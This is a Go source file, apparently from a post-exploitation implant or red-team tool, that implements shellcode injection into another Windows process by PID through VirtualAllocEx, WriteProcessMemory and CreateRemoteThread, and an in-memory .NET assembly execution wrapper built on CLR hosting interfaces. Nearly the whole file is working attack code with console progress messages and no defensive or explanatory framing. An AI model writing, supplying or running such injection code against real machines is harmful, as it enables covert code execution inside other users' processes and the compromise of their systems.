package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"runtime"
	"golang.org/x/sys/windows"
)

var kernel32 = windows.NewLazySystemDLL("kernel32.dll")

var (
	virtualAllocEx        = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory    = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread    = kernel32.NewProc("CreateRemoteThread")
	WaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
	closeHandle           = kernel32.NewProc("CloseHandle")
	modMSCoree            = syscall.NewLazyDLL("mscoree.dll")
	procCLRCreateInstance = modMSCoree.NewProc("CLRCreateInstance")
	CLSID_CLRMetaHost     = windows.GUID{Data1: 0x9280188d, Data2: 0xe8e, Data3: 0x4867, Data4: [8]byte{0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
	IID_ICLRMetaHost      = windows.GUID{Data1: 0xD332DB9E, Data2: 0xB9B3, Data3: 0x4125, Data4: [8]byte{0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}}
	IID_ICLRRuntimeInfo   = windows.GUID{Data1: 0xBD39D1D2, Data2: 0xBA2F, Data3: 0x486a, Data4: [8]byte{0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}}

	CLSID_CLRRuntimeHost = windows.GUID{Data1: 0x90F1A06E, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}
	IID_ICLRRuntimeHost  = windows.GUID{Data1: 0x90F1A06C, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}

	IID_ICorRuntimeHost  = windows.GUID{Data1: 0xcb2f6722, Data2: 0xab3a, Data3: 0x11d2, Data4: [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}
	CLSID_CorRuntimeHost = windows.GUID{Data1: 0xcb2f6723, Data2: 0xab3a, Data3: 0x11d2, Data4: [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}

	IID_AppDomain = windows.GUID{Data1: 0x5f696dc, Data2: 0x2b29, Data3: 0x3663, Data4: [8]uint8{0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}}
)

func execute_assembly(asm []byte) (string, error) {
	runtime.KeepAlive(asm)
	runtime := ""
	params := []string{}
	res, err := ExecuteByteArray(runtime, asm, params)
	if err != nil {
		return "", err
	}
	return res, nil
}

func inject(pid int, shellcode []byte) (string, error) {
	fmt.Println("[*] Injecting into PID:", pid)
	fmt.Println("[*] Shellcode length:", len(shellcode))
	process_handle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(pid))
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Opening handle to process...", process_handle)
	defer windows.CloseHandle(process_handle)

	addr, _, err := virtualAllocEx.Call(uintptr(process_handle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "", err
	}

	fmt.Println("[*] Allocating memory...")

	a, _, err := writeProcessMemory.Call(uintptr(process_handle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if a == 0 {
		return "", err
	}

	fmt.Println("[*] Writing shellcode to memory...")

	thread_handle, _, err := createRemoteThread.Call(uintptr(process_handle), 0, 0, addr, 0, 0, 0)
	fmt.Println("[*] Executing shellcode...")
	if thread_handle == 0 {
		fmt.Println("[*] Error:", err)
		return "", err
	}

	closeHandle.Call(uintptr(thread_handle))
	closeHandle.Call(uintptr(process_handle))

	return "OK", nil
}
